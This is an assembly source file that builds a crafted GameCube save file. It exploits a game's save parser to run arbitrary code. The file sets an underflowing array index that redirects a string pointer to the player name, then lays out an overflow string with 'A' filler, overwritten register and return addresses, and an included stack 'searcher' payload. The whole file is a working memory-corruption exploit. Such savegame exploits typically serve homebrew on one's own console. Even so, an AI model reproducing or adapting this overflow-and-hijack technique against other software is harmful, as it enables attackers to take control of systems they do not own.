// Copyright 2016 FIX94
// This code is licensed to you under the terms of the GNU GPL, version 2;
// see file LICENSE or http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt

	.section .fstart,"ax"
	.globl fbegin
fbegin:
0:	// gci "header" we use
	.incbin "ggyp.hdr"

	// save start
	.long 0x55424953
	.long 0x4F465400

	// player name, will be used for pointer
	// on mem to our overflow string
	.long 0x80DC5068 //will be 8053ac94 on stack
	.long 0x80DC5068 //will be 8053ac98 on stack
	.byte 0

	// save settings
	.short 0x5249
	.long 1 ; .long 0
	.long 1 ; .long 0
	.long 1 ; .long 0
	.long 3 ; .long 0
	.long 0

	// this index underflows a string pointer array at 0x80DC4870 to point to the
	// player name on stack (8053ac98) where we set pointers to our overflow string
	.long 0xFFF49DAE

	// more settings
	.fill 0x35,1,0x00

	// time to set up our overflow string for 0x80DC5068
	.fill 0x80,1,0x41
	// r28, point to stack position of our code
	.long 0x8053AC04
	// r29,r30,r31, stack store position, arent using those
	.fill 0x10,1,0x41
	// This function will execute code further down the stack 
	.long 0x802BFCC8
	// more overflow string filler
	.fill 0xD,1,0x41
	// this is actually required for the save to be "valid"
	.byte 1
	// last of the overflow string filler
	.fill 0xE,1,0x41
	// Our stack code searcher that gets executed from above at 0x8053AC04
	.incbin "searcher.bin"
